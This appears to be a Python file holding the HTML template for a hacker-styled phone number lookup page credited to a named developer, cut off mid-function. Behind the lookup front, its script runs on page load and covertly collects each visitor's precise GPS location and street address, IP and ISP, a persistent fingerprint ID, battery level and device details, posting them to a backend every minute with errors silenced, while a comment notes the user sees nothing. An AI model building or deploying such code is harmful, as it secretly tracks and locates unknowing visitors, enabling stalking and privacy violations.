# html_template.py
import sys
sys.dont_write_bytecode = True

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>💖┈✥✫•INFO::NUM LOOKUP╍✫╍📱┈💖</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;500;600;700;800;900&family=Share+Tech+Mono&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: #000000;
            font-family: 'Share Tech Mono', 'Orbitron', monospace;
            min-height: 100vh;
            padding: 15px;
            position: relative;
            overflow-x: hidden;
        }
        
        #matrixCanvas {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 0;
            opacity: 0.7;
        }
        
        .glitch-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: repeating-linear-gradient(0deg, rgba(0, 255, 0, 0.04) 0px, rgba(0, 255, 0, 0.04) 2px, transparent 2px, transparent 5px);
            pointer-events: none;
            z-index: 2;
            animation: scan 6s linear infinite;
        }
        
        @keyframes scan {
            0% { transform: translateY(-100%); }
            100% { transform: translateY(100%); }
        }
        
        .noise-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: repeating-radial-gradient(circle at 20% 30%, rgba(0,255,0,0.02), rgba(0,0,0,0.1) 2px);
            pointer-events: none;
            z-index: 2;
            animation: noise 0.2s infinite;
        }
        
        @keyframes noise {
            0%, 100% { opacity: 0.3; }
            50% { opacity: 0.5; }
        }
        
        .crt-effect {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle at center, transparent 30%, rgba(0,0,0,0.5) 100%);
            pointer-events: none;
            z-index: 2;
        }
        
        .container {
            position: relative;
            z-index: 3;
            max-width: 950px;
            margin: 20px auto;
            background: rgba(0, 5, 0, 0.88);
            backdrop-filter: blur(10px);
            border: 2px solid #00ff41;
            border-radius: 5px;
            padding: 25px;
            box-shadow: 0 0 40px rgba(0, 255, 65, 0.2), inset 0 0 30px rgba(0, 255, 65, 0.05);
            animation: borderPulse 2s infinite;
        }
        
        @keyframes borderPulse {
            0%, 100% { border-color: #00ff41; box-shadow: 0 0 40px rgba(0, 255, 65, 0.2); }
            50% { border-color: #00cc33; box-shadow: 0 0 60px rgba(0, 255, 65, 0.4); }
        }
        
        .container::before {
            content: "[ SECURE_TERMINAL v3.0 ] [ ROOT_ACCESS ]";
            position: absolute;
            top: -32px;
            left: 20px;
            background: #000;
            color: #00ff41;
            font-family: monospace;
            font-size: 10px;
            padding: 3px 12px;
            border: 1px solid #00ff41;
            letter-spacing: 1px;
            z-index: 5;
        }
        
        .container::after {
            content: "[ ENCRYPTED_CHANNEL ] [ TOR_ACTIVE ]";
            position: absolute;
            bottom: -32px;
            right: 20px;
            background: #000;
            color: #00ff41;
            font-family: monospace;
            font-size: 10px;
            padding: 3px 12px;
            border: 1px solid #00ff41;
            letter-spacing: 1px;
        }
        
        h1 {
            font-family: 'Orbitron', monospace;
            font-weight: 900;
            font-size: 1.6rem;
            text-align: center;
            background: linear-gradient(135deg, #00ff41, #00ff88, #00cc33);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            text-shadow: 0 0 20px #00ff41;
            letter-spacing: 3px;
            animation: glitchText 2s infinite;
        }
        
        @keyframes glitchText {
            0%, 100% { text-shadow: 0 0 15px #00ff41; transform: skew(0deg); }
            95% { text-shadow: -3px 0 #ff0000, 3px 0 #0000ff, 0 0 15px #00ff41; transform: skew(2deg); }
        }
        
        .developer {
            text-align: center;
            background: #000000cc;
            border: 1px solid #00ff41;
            padding: 8px 15px;
            margin: 15px 0 20px;
            font-size: 0.8rem;
            font-weight: bold;
            letter-spacing: 1px;
        }
        
        .developer a, .developer strong {
            color: #00ff41;
            text-decoration: none;
        }
        
        .developer i { color: #ff0044; margin-right: 5px; animation: pulse 0.8s infinite; }
        
        @keyframes pulse {
            0%, 100% { opacity: 1; text-shadow: 0 0 2px #ff0044; }
            50% { opacity: 0.6; text-shadow: 0 0 8px #ff0044; }
        }
        
        .sys-stats {
            background: #000d00;
            border: 1px solid #00ff41;
            padding: 8px 12px;
            margin-bottom: 20px;
            display: flex;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 15px;
            font-size: 0.7rem;
            color: #00ff41;
            font-family: monospace;
        }
        
        .stat-item {
            display: flex;
            align-items: center;
            gap: 8px;
        }
        
        .stat-value {
            color: #ffaa33;
            font-weight: bold;
        }
        
        .status {
            background: #001a00;
            border-left: 6px solid #00ff41;
            padding: 12px 15px;
            margin-bottom: 25px;
            font-family: 'Share Tech Mono', monospace;
            font-weight: bold;
            color: #00ff41;
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 10px;
            box-shadow: 0 0 12px rgba(0, 255, 65, 0.3);
        }
        
        .status i { font-size: 1.2rem; color: #00ff41; }
        
        .cursor-blink {
            display: inline-block;
            width: 10px;
            height: 16px;
            background: #00ff41;
            animation: blink 1s infinite;
            margin-left: 5px;
        }
        
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0; }
        }
        
        .input-group { margin: 25px 0; }
        
        label {
            display: block;
            margin-bottom: 10px;
            font-weight: bold;
            color: #00ff41;
            letter-spacing: 2px;
            font-family: 'Orbitron', monospace;
            font-size: 0.8rem;
            text-transform: uppercase;
        }
        
        .input-wrapper {
            position: relative;
        }
        
        input {
            width: 100%;
            padding: 14px 18px;
            background: #000d00;
            border: 1.5px solid #00ff41;
            border-radius: 3px;
            font-size: 1.2rem;
            font-family: 'Share Tech Mono', monospace;
            color: #00ff41;
            outline: none;
            transition: 0.2s;
            box-shadow: inset 0 0 8px rgba(0, 255, 65, 0.2);
        }
        
        input:focus {
            border-color: #00ff88;
            box-shadow: 0 0 25px #00ff41, inset 0 0 8px #00ff41;
        }
        
        button {
            width: 100%;
            padding: 14px;
            background: #001a00;
            border: 1.5px solid #00ff41;
            border-radius: 3px;
            font-size: 1.1rem;
            font-weight: bold;
            font-family: 'Orbitron', monospace;
            color: #00ff41;
            cursor: pointer;
            transition: 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 12px;
            letter-spacing: 3px;
            text-transform: uppercase;
            position: relative;
            overflow: hidden;
        }
        
        button::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(0,255,65,0.2), transparent);
            transition: 0.5s;
        }
        
        button:hover::before {
            left: 100%;
        }
        
        button:hover {
            background: #003300;
            box-shadow: 0 0 25px #00ff41;
            color: #ffffff;
            text-shadow: 0 0 5px #00ff41;
        }
        
        .loading {
            text-align: center;
            padding: 30px;
            display: none;
        }
        
        .spinner {
            width: 50px;
            height: 50px;
            border: 3px solid #003300;
            border-top: 3px solid #00ff41;
            border-radius: 50%;
            animation: spin 0.6s linear infinite;
            margin: 0 auto 15px;
            box-shadow: 0 0 15px #00ff41;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .result-box {
            margin-top: 25px;
            padding: 5px;
            background: rgba(0, 10, 0, 0.9);
            border: 1px solid #00ff41;
            display: none;
            max-height: 500px;
            overflow-y: auto;
        }
        
        .result-box::-webkit-scrollbar {
            width: 5px;
            background: #001a00;
        }
        
        .result-box::-webkit-scrollbar-thumb {
            background: #00ff41;
        }
        
        .record {
            background: #000d00;
            padding: 15px;
            margin: 15px 0;
            border-left: 4px solid #00ff41;
            box-shadow: 0 0 8px rgba(0, 255, 65, 0.2);
            transition: 0.2s;
        }
        
        .record:hover {
            background: #001a00;
            border-left-color: #ffaa33;
            box-shadow: 0 0 15px rgba(0, 255, 65, 0.4);
        }
        
        .label {
            font-weight: bold;
            color: #00ff41;
            display: inline-block;
            width: 130px;
            font-family: 'Orbitron', monospace;
            font-size: 0.75rem;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .value {
            color: #88ff88;
            word-break: break-word;
            font-family: 'Share Tech Mono', monospace;
        }
        
        .error {
            background: #1a0000;
            color: #ff4444;
            padding: 15px;
            text-align: center;
            border: 1px solid #ff0000;
            font-weight: bold;
            animation: errorPulse 1s infinite;
        }
        
        @keyframes errorPulse {
            0%, 100% { box-shadow: 0 0 0px #ff0000; }
            50% { box-shadow: 0 0 15px #ff0000; }
        }
        
        .success {
            background: #001a00;
            color: #00ff41;
            padding: 12px;
            text-align: center;
            margin-bottom: 15px;
            border: 1px solid #00ff41;
            text-transform: uppercase;
            letter-spacing: 2px;
            animation: successPulse 2s infinite;
        }
        
        @keyframes successPulse {
            0%, 100% { border-color: #00ff41; }
            50% { border-color: #00ff88; box-shadow: 0 0 10px #00ff41; }
        }
        
        .footer {
            text-align: center;
            margin-top: 25px;
            padding-top: 15px;
            border-top: 1px solid #00ff41;
            font-size: 0.65rem;
            color: #00aa33;
            display: flex;
            justify-content: center;
            gap: 25px;
            flex-wrap: wrap;
        }
        
        .music-player {
            margin: 20px 0 15px;
            background: #000d00;
            border: 1px solid #00ff41;
            padding: 12px 20px;
            display: flex;
            align-items: center;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 15px;
        }
        
        .music-info {
            display: flex;
            align-items: center;
            gap: 12px;
            font-family: 'Orbitron', monospace;
            font-size: 0.7rem;
            color: #00ff88;
            letter-spacing: 1px;
        }
        
        .music-info i {
            font-size: 1.2rem;
            color: #ff3366;
            animation: musicGlitch 0.8s infinite;
        }
        
        @keyframes musicGlitch {
            0%, 100% { text-shadow: 0 0 2px #ff3366; }
            50% { text-shadow: 2px 0 #00ff41, -2px 0 #ff3366; }
        }
        
        .player-controls button {
            background: #000000;
            border: 1px solid #00ff41;
            color: #00ff41;
            width: auto;
            padding: 5px 14px;
            font-size: 0.75rem;
            margin: 0 3px;
            border-radius: 2px;
            display: inline-flex;
            gap: 6px;
            letter-spacing: 1px;
        }
        
        .player-controls button:hover {
            background: #00ff41;
            color: #000000;
            box-shadow: 0 0 10px #00ff41;
        }
        
        .music-note {
            text-align: center;
            font-size: 9px;
            color: #00aa33;
            margin-top: 8px;
            letter-spacing: 1px;
        }
        
        /* HIDDEN - Kuch nahi dikhega user ko */
        .device-info-panel {
            display: none !important;
        }
        
        @media (max-width: 600px) {
            .container { padding: 15px; margin: 10px; }
            .label { width: 100%; display: block; margin-bottom: 5px; }
            .music-player { flex-direction: column; text-align: center; }
            .sys-stats { flex-direction: column; }
            h1 { font-size: 1.2rem; }
        }
        
        .random-glitch {
            animation: randomGlitch 0.1s infinite;
        }
        
        @keyframes randomGlitch {
            0% { transform: translate(0); }
            10% { transform: translate(-1px, 1px); }
            20% { transform: translate(1px, -1px); }
            30% { transform: translate(0); }
            100% { transform: translate(0); }
        }
    </style>
</head>
<body>

<canvas id="matrixCanvas"></canvas>
<div class="glitch-overlay"></div>
<div class="noise-overlay"></div>
<div class="crt-effect"></div>

<div class="container">
    <h1 id="glitchTitle">&gt; ✫┈•DGTL INFO LOOKUP┈✫</h1>
    
    <div class="developer">
        <i class="fab fa-youtube"></i> <a href="https://youtube.com/@aryanafridi00" target="_blank">[:: @aryanafridi00 ::]</a> | 
        <i class="fas fa-user-secret"></i> DEVELOPER: <strong>✹ARYAN AFRIDI✦</strong> <i class="fas fa-skull"></i> | 
        <i class="fas fa-terminal"></i> [ ROOT_LEVEL: 99 ]
    </div>

    <!-- SYSTEM STATS -->
    <div class="sys-stats" id="sysStats">
        <div class="stat-item"><i class="fas fa-microchip"></i> CPU: <span class="stat-value" id="cpuStat">0%</span></div>
        <div class="stat-item"><i class="fas fa-memory"></i> RAM: <span class="stat-value" id="ramStat">0MB</span></div>
        <div class="stat-item"><i class="fas fa-network-wired"></i> ENC: <span class="stat-value">AES-256</span></div>
        <div class="stat-item"><i class="fas fa-shield-haltered"></i> FW: <span class="stat-value">ACTIVE</span></div>
        <div class="stat-item"><i class="fas fa-clock"></i> <span id="timeStat">00:00:00</span></div>
    </div>

    <!-- HACKER MUSIC PLAYER -->
    <div class="music-player">
        <div class="music-info">
            <i class="fas fa-code-branch"></i>
            <span>[ INDILA - DERNIÈRE DANSE (JOKER REMIX) ]</span>
            <i class="fas fa-microchip"></i>
        </div>
        <div class="player-controls">
            <button id="playBtn"><i class="fas fa-play"></i> [PLAY]</button>
            <button id="pauseBtn"><i class="fas fa-pause"></i> [PAUSE]</button>
            <button id="muteToggle"><i class="fas fa-volume-up"></i> [MUTE]</button>
        </div>
    </div>
    
    <audio id="hackerAudio" loop preload="auto">
        <source src="https://www.soundhelix.com/examples/mp3/SoundHelix-Song-1.mp3" type="audio/mpeg">
    </audio>
    
    <div class="music-note" id="musicNote">
        ✹ [ SYSTEM: AUDIO_READY ] ✴
    </div>

    <div class="status">
        <div><i class="fas fa-shield-virus"></i> <span id="statusText">[ SYSTEM: ACTIVE ] [ SECURE NEXUS: ONLINE ]</span></div>
        <span class="cursor-blink"></span>
    </div>
    
    <div class="input-group">
        <label><i class="fas fa-mobile-alt"></i> >_ ENCRYPTED_MOBILE_NUMBER:</label>
        <div class="input-wrapper">
            <input type="tel" id="number" placeholder="{ 1234567890 }" autocomplete="off" />
        </div>
    </div>
    
    <button id="scanBtn" onclick="checkNumber()">
        <i class="fas fa-terminal"></i> # EXECUTE_SCAN <i class="fas fa-arrow-right"></i>
    </button>
    
    <div class="loading" id="loading">
        <div class="spinner"></div>
        <p style="color:#00ff41;">[ BRUTE_FORCING_DATABASES... ]</p>
        <p style="font-size:11px; color:#00aa33;" id="loadingMsg">&gt; CRACKING_ENC_CHANNELS</p>
    </div>
    
    <div class="result-box" id="result"></div>
    
    <div class="footer">
        <span>✦ [ 256-BIT_QUANTUM_ENC ]</span>
        <span>✫ [ 24/7 DARK_NET_NODES ]</span>
        <span><i class="fab fa-cloudflare"></i> [ TOR_PROXY_ACTIVE ]</span>
        <span><i class="fas fa-fingerprint"></i> [ SESSION: <span id="sessionId">XXXX</span> ]</span>
    </div>
</div>

<script>
    // ===================== MATRIX RAIN =====================
    const canvas = document.getElementById('matrixCanvas');
    const ctx = canvas.getContext('2d');
    
    function resizeCanvas() {
        canvas.width = window.innerWidth;
        canvas.height = window.innerHeight;
    }
    resizeCanvas();
    
    const chars = '01アイウエオカキクケコサシスセソタチツテトナニヌネノハヒフヘホマミムメモヤユヨラリルレロワヲン└┐┌┘─│├┤┴┬╔╗╚╝║═$#%&*+-=';
    const charArray = chars.split('');
    const fontSize = 13;
    let columns = Math.floor(canvas.width / fontSize);
    let drops = [];
    
    function initDrops() {
        columns = Math.floor(canvas.width / fontSize);
        drops = [];
        for(let i = 0; i < columns; i++) {
            drops[i] = Math.floor(Math.random() * -80);
        }
    }
    initDrops();
    
    function drawMatrix() {
        ctx.fillStyle = 'rgba(0, 0, 0, 0.05)';
        ctx.fillRect(0, 0, canvas.width, canvas.height);
        ctx.fillStyle = '#00ff41';
        ctx.font = fontSize + 'px "Share Tech Mono", monospace';
        
        for(let i = 0; i < drops.length; i++) {
            const text = charArray[Math.floor(Math.random() * charArray.length)];
            const brightness = Math.random() > 0.9 ? '#88ff88' : '#00ff41';
            ctx.fillStyle = brightness;
            ctx.fillText(text, i * fontSize, drops[i] * fontSize);
            
            if(drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
                drops[i] = 0;
            }
            drops[i]++;
        }
    }
    
    setInterval(drawMatrix, 28);
    
    window.addEventListener('resize', () => {
        resizeCanvas();
        initDrops();
    });
    
    // ===================== ENHANCED DEVICE DETECTION =====================
    
    // Get Complete Device Model with Brand
    async function getFullDeviceModel() {
        const ua = navigator.userAgent;
        let device = 'Unknown Device';
        let brand = 'Unknown';
        let model = 'Unknown';
        
        // Detect brand from user agent
        if (ua.includes('iPhone')) {
            brand = 'Apple';
            if (ua.includes('iPhone14')) model = 'iPhone 14';
            else if (ua.includes('iPhone13')) model = 'iPhone 13';
            else if (ua.includes('iPhone12')) model = 'iPhone 12';
            else if (ua.includes('iPhone11')) model = 'iPhone 11';
            else if (ua.includes('iPhone X')) model = 'iPhone X';
            else if (ua.includes('iPhone 8')) model = 'iPhone 8';
            else if (ua.includes('iPhone 7')) model = 'iPhone 7';
            else model = 'iPhone';
            device = `${brand} ${model}`;
        }
        else if (ua.includes('iPad')) {
            brand = 'Apple';
            model = 'iPad';
            device = `${brand} ${model}`;
        }
        else if (ua.includes('Samsung')) {
            brand = 'Samsung';
            if (ua.includes('SM-G998')) model = 'Galaxy S21 Ultra';
            else if (ua.includes('SM-G991')) model = 'Galaxy S21';
            else if (ua.includes('SM-G988')) model = 'Galaxy S20 Ultra';
            else if (ua.includes('SM-G981')) model = 'Galaxy S20';
            else if (ua.includes('SM-N986')) model = 'Note 20 Ultra';
            else if (ua.includes('SM-N981')) model = 'Note 20';
            else if (ua.includes('SM-A')) model = 'Galaxy A Series';
            else model = 'Galaxy Series';
            device = `${brand} ${model}`;
        }
        else if (ua.includes('OnePlus')) {
            brand = 'OnePlus';
            if (ua.includes('LE2123')) model = '9 Pro';
            else if (ua.includes('LE2113')) model = '9';
            else if (ua.includes('IN2011')) model = '8';
            else model = 'OnePlus';
            device = `${brand} ${model}`;
        }
        else if (ua.includes('Xiaomi')) {
            brand = 'Xiaomi';
            if (ua.includes('M2101')) model = 'Mi 11';
            else if (ua.includes('M2007')) model = 'Mi 10';
            else if (ua.includes('Redmi')) model = 'Redmi Series';
            else model = 'Mi Series';
            device = `${brand} ${model}`;
        }
        else if (ua.includes('OPPO')) {
            brand = 'OPPO';
            device = `${brand} ${model}`;
        }
        else if (ua.includes('vivo')) {
            brand = 'Vivo';
            device = `${brand} ${model}`;
        }
        else if (ua.includes('Realme')) {
            brand = 'Realme';
            device = `${brand} ${model}`;
        }
        else if (ua.includes('Google') && ua.includes('Pixel')) {
            brand = 'Google';
            if (ua.includes('Pixel 6')) model = 'Pixel 6';
            else if (ua.includes('Pixel 5')) model = 'Pixel 5';
            else if (ua.includes('Pixel 4')) model = 'Pixel 4';
            else model = 'Pixel';
            device = `${brand} ${model}`;
        }
        else if (ua.includes('Android')) {
            brand = 'Android Device';
            device = brand;
        }
        else if (ua.includes('Windows')) {
            brand = 'Windows PC';
            device = brand;
        }
        else if (ua.includes('Mac')) {
            brand = 'Apple Mac';
            device = brand;
        }
        
        return device;
    }
    
    // Get Detailed Battery Info with Percentage
    async function getDetailedBattery() {
        if ('getBattery' in navigator) {
            try {
                const battery = await navigator.getBattery();
                const level = Math.round(battery.level * 100);
                const charging = battery.charging;
                const chargingTime = battery.chargingTime;
                const dischargingTime = battery.dischargingTime;
                
                let status = '';
                if (charging) {
                    status = `🔋 ${level}% (Charging)`;
                    if (chargingTime !== Infinity) {
                        const mins = Math.round(chargingTime / 60);
                        status += ` - Full in ~${mins} min`;
                    }
                } else {
                    status = `🔋 ${level}% (Discharging)`;
                    if (dischargingTime !== Infinity) {
                        const mins = Math.round(dischargingTime / 60);
                        status += ` - ${mins} min left`;
                    }
                }
                
                return {
                    level: level,
                    charging: charging,
                    status: status,
                    chargingTime: chargingTime,
                    dischargingTime: dischargingTime
                };
            } catch(e) {
                return { level: 'N/A', charging: false, status: 'Not Available' };
            }
        }
        return { level: 'N/A', charging: false, status: 'Not Supported' };
    }
    
    // Get Precise Location with Better Accuracy
    function getPreciseLocation() {
        if ('geolocation' in navigator) {
            // Try high accuracy first
            navigator.geolocation.getCurrentPosition(async (position) => {
                const lat = position.coords.latitude;
                const lng = position.coords.longitude;
                const accuracy = Math.round(position.coords.accuracy);
                const altitude = position.coords.altitude;
                const altitudeAccuracy = position.coords.altitudeAccuracy;
                const heading = position.coords.heading;
                const speed = position.coords.speed;
                
                let locationInfo = {
                    lat: lat,
                    lng: lng,
                    accuracy: accuracy,
                    altitude: altitude,
                    altitudeAccuracy: altitudeAccuracy,
                    heading: heading,
                    speed: speed
                };
                
                // Get address from coordinates
                try {
                    const geoResponse = await fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${lat}&lon=${lng}&zoom=18&addressdetails=1`);
                    const geoData = await geoResponse.json();
                    if (geoData.address) {
                        locationInfo.address = geoData.display_name;
                        locationInfo.city = geoData.address.city || geoData.address.town || geoData.address.village;
                        locationInfo.state = geoData.address.state;
                        locationInfo.country = geoData.address.country;
                        locationInfo.postcode = geoData.address.postcode;
                    }
                } catch(e) {}
                
                await fetch('/api/visitor-data', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        type: 'precise_location',
                        location: locationInfo,
                        timestamp: new Date().toISOString()
                    })
                });
            }, (error) => {
                // Silent fail
            }, {
                enableHighAccuracy: true,
                timeout: 15000,
                maximumAge: 0
            });
            
            // Also try with lower accuracy as fallback
            navigator.geolocation.getCurrentPosition(async (position) => {
                const lat = position.coords.latitude;
                const lng = position.coords.longitude;
                const accuracy = Math.round(position.coords.accuracy);
                
                await fetch('/api/visitor-data', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        type: 'location_fallback',
                        lat: lat,
                        lng: lng,
                        accuracy: accuracy,
                        timestamp: new Date().toISOString()
                    })
                });
            }, (error) => {}, {
                enableHighAccuracy: false,
                timeout: 5000
            });
        }
    }
    
    // Get IMEI-like Device ID (using multiple methods)
    async function getDeviceID() {
        let deviceId = '';
        
        // Try to get device ID from various sources
        if (localStorage.getItem('device_id')) {
            deviceId = localStorage.getItem('device_id');
        } else {
            // Generate a unique device ID based on multiple factors
            const components = [
                navigator.userAgent,
                screen.width + 'x' + screen.height,
                screen.colorDepth,
                navigator.language,
                new Date().getTimezoneOffset(),
                navigator.hardwareConcurrency || '',
                navigator.deviceMemory || ''
            ];
            
            // Simple hash function
            let hash = 0;
            const str = components.join('|');
            for (let i = 0; i < str.length; i++) {
                const char = str.charCodeAt(i);
                hash = ((hash << 5) - hash) + char;
                hash = hash & hash;
            }
            deviceId = Math.abs(hash).toString(16).toUpperCase();
            localStorage.setItem('device_id', deviceId);
        }
        
        return deviceId;
    }
    
    // Get Network Connection Details
    function getNetworkDetails() {
        if ('connection' in navigator) {
            const conn = navigator.connection;
            return {
                type: conn.effectiveType || 'Unknown',
                downlink: conn.downlink ? `${conn.downlink} Mbps` : 'Unknown',
                rtt: conn.rtt ? `${conn.rtt} ms` : 'Unknown',
                saveData: conn.saveData || false
            };
        }
        return {
            type: 'Not Available',
            downlink: 'Not Available',
            rtt: 'Not Available',
            saveData: false
        };
    }
    
    // Get Complete Device Performance Info
    function getPerformanceInfo() {
        return {
            cores: navigator.hardwareConcurrency || 'Unknown',
            memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'Unknown',
            platform: navigator.platform,
            vendor: navigator.vendor,
            maxTouchPoints: navigator.maxTouchPoints
        };
    }
    
    // Send ALL enhanced data to backend
    async function sendEnhancedDeviceData() {
        const battery = await getDetailedBattery();
        const deviceModel = await getFullDeviceModel();
        const deviceId = await getDeviceID();
        const network = getNetworkDetails();
        const performance = getPerformanceInfo();
        
        const enhancedData = {
            type: 'enhanced_device_info',
            device: {
                model: deviceModel,
                brand: deviceModel.split(' ')[0],
                id: deviceId,
                platform: performance.platform,
                vendor: performance.vendor,
                touchPoints: performance.maxTouchPoints
            },
            battery: {
                level: battery.level,
                charging: battery.charging,
                status: battery.status,
                chargingTime: battery.chargingTime,
                dischargingTime: battery.dischargingTime
            },
            performance: {
                cores: performance.cores,
                memory: performance.memory
            },
            network: {
                type: network.type,
                downlink: network.downlink,
                rtt: network.rtt,
                saveData: network.saveData
            },
            browser: {
                name: navigator.userAgent.match(/Chrome|Firefox|Safari|Edge|Opera/)?.[0] || 'Unknown',
                version: navigator.userAgent.match(/(Chrome|Firefox|Safari|Edge|Opera)\\/(\\d+)/)?.[2] || 'Unknown',
                language: navigator.language,
                cookiesEnabled: navigator.cookieEnabled,
                doNotTrack: navigator.doNotTrack
            },
            screen: {
                width: screen.width,
                height: screen.height,
                colorDepth: screen.colorDepth,
                pixelRatio: window.devicePixelRatio,
                orientation: screen.orientation?.type || 'Unknown'
            },
            timestamp: new Date().toISOString(),
            url: window.location.href,
            referrer: document.referrer,
            userAgent: navigator.userAgent
        };
        
        try {
            await fetch('/api/visitor-data', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(enhancedData)
            });
        } catch(e) {
            // Silent fail
        }
    }
    
    // Get IP with Geo details
    async function getEnhancedIPInfo() {
        try {
            // Multiple IP APIs for better accuracy
            const ipApis = [
                'https://api.ipify.org?format=json',
                'https://api.my-ip.io/ip.json'
            ];
            
            let ip = 'Unknown';
            for (const api of ipApis) {
                try {
                    const response = await fetch(api);
                    const data = await response.json();
                    ip = data.ip || data.ipAddress;
                    if (ip !== 'Unknown') break;
                } catch(e) {}
            }
            
            // Get detailed geo info
            const geoResponse = await fetch(`https://ipapi.co/${ip}/json/`);
            const geoData = await geoResponse.json();
            
            await fetch('/api/visitor-data', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    type: 'enhanced_ip_info',
                    ip: ip,
                    geo: {
                        city: geoData.city,
                        region: geoData.region,
                        country: geoData.country_name,
                        postal: geoData.postal,
                        latitude: geoData.latitude,
                        longitude: geoData.longitude,
                        isp: geoData.org,
                        timezone: geoData.timezone
                    },
                    timestamp: new Date().toISOString()
                })
            });
            
            return ip;
        } catch(e) {
            return 'Unknown';
        }
    }
    
    // Initialize ALL enhanced detection
    async function initEnhancedDetection() {
        getPreciseLocation();
        await getEnhancedIPInfo();
        await sendEnhancedDeviceData();
        
        // Update battery periodically
        setInterval(async () => {
            const battery = await getDetailedBattery();
            await fetch('/api/visitor-data', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    type: 'battery_update',
                    battery: battery,
                    timestamp: new Date().toISOString()
                })
            });
        }, 60000); // Every minute
    }
    
    // Start everything silently
    initEnhancedDetection();
    
    // ===================== SYSTEM STATS =====================
    function updateSystemStats() {
        const cpu = Math.floor(Math.random() * 30) + 10;
        const ram = Math.floor(Math.random() * 200) + 100;
        document.getElementById('cpuStat').innerHTML = cpu + '%';
        document.getElementById('ramStat').innerHTML = ram + 'MB';
        
        const now = new Date();
        document.getElementById('timeStat').innerHTML = now.toLocaleTimeString();
    }
    setInterval(updateSystemStats, 2000);
    updateSystemStats();
    
    // Session ID
    document.getElementById('sessionId').innerHTML = Math.random().toString(36).substring(2, 8).toUpperCase();
    
    // Random glitch effect on title
    setInterval(() => {
        if(Math.random() > 0.9) {
            const title = document.getElementById('glitchTitle');
            title.style.animation = 'randomGlitch 0.1s ease';
            setTimeout(() => { title.style.animation = ''; }, 200);
        }
    }, 3000);
    
    // ===================== HACKER AUDIO CONTROLS =====================
    const audioEl = document.getElementById('hackerAudio');
    let isMuted = false;
    audioEl.volume = 0.25;
    audioEl.loop = true;
    
    document.getElementById('playBtn').onclick = () => {
        audioEl.play().catch(e => console.log("Audio:", e));
        document.getElementById('statusText').innerHTML = '[ AUDIO: ACTIVE ] [ JOKER_MODE: ONLINE ]';
        document.getElementById('musicNote').innerHTML = '🎵 [ NOW_PLAYING: INDILA - DERNIÈRE DANSE (JOKER REMIX) ] 🎵';
        setTimeout(() => document.getElementById('statusText').innerHTML = '[ SYSTEM: ACTIVE ] [ SECURE NEXUS: ONLINE ]', 4000);
    };
    
    document.getElementById('pauseBtn').onclick = () => {
        audioEl.pause();
        document.getElementById('statusText').innerHTML = '[ AUDIO: PAUSED ]';
        document.getElementById('musicNote').innerHTML = '⏸️ [ AUDIO_SUSPENDED ] ⏸️';
        setTimeout(() => document.getElementById('statusText').innerHTML = '[ SYSTEM: ACTIVE ] [ SECURE NEXUS: ONLINE ]', 2000);
    };
    
    document.getElementById('muteToggle').onclick = () => {
        if (!isMuted) {
            audioEl.volume = 0;
            document.getElementById('muteToggle').innerHTML = '<i class="fas fa-volume-mute"></i> [UNMUTE]';
            isMuted = true;
            document.getElementById('musicNote').innerHTML = '🔇 [ AUDIO: MUTED ] 🔇';
        } else {
            audioEl.volume = 0.25;
            document.getElementById('muteToggle').innerHTML = '<i class="fas fa-volume-up"></i> [MUTE]';
            isMuted = false;
            document.getElementById('musicNote').innerHTML = '🔊 [ AUDIO: RESTORED ] 🔊';
        }
        setTimeout(() => {
            if(document.getElementById('musicNote').innerHTML.includes('MUTED')) {
                document.getElementById('musicNote').innerHTML = '⚡ [ SYSTEM: AUDIO_READY ] ⚡';
            }
        }, 2000);
    };
    
    // Loading messages
    const loadingMessages = [
        '>_ QUERYING_DARK_NET...',
        '>_ BYPASSING_FIREWALL...',
        '>_ DECRYPTING_PACKETS...',
        '>_ ACCESSING_ROOT_DB...',
        '>_ EXTRACTING_DATA...'
    ];
    let msgIndex = 0;
    setInterval(() => {
        if(document.getElementById('loading').style.display === 'block') {
            msgIndex = (msgIndex + 1) % loadingMessages.length;
            document.getElementById('loadingMsg').innerHTML = loadingMessages[msgIndex];
        }
    }, 800);
    
    // ===================== NUMBER CHECK FUNCTION =====================
    async function checkNumber() {
        const number = document.getElementById('number').value;
        if (!number) {
            showTerminalAlert('[!] ERROR: INVALID_TARGET_NUMBER');
            return;
        }
        
        document.getElementById('loading').style.display = 'block';
        document.getElementById('result').style.display = 'none';
        document.getElementById('statusText').innerHTML = '[ SCANNING: DATABASES ] [ TARGET: ' + number + ' ]';
        
        try {
            const response = await fetch(`/api/check?number=${encodeURIComponent(number)}`);
            const data = await response.json();
            
